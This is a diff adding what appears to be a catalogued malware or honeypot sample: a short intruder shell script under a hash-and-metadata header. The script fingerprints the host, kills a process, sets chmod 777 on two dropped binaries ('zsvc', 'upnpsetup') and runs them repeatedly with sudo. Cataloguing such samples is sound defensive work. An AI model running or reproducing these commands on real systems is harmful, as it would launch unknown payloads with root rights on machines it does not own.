@@ -1,0 +1,20 @@
+# sha256: a2ebb4da1f116bb16cffecd7fb77039520059a65c1f20bf9c53cc82461637d90
+# family: script_generic
+# kind: script
+# size_bytes: 155
+# first_seen: 2026-07-22 03:25:24.967942 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+uname -a
+hostname
+uname -m&&pkill upnpsetup
+chmod 777 zsvc
+chmod 777 upnpsetup
+sudo ./upnpsetup
+./upnpsetup
+sudo ./zsvc
+./zsvc
+sudo ./upnpsetup
+./upnpsetup
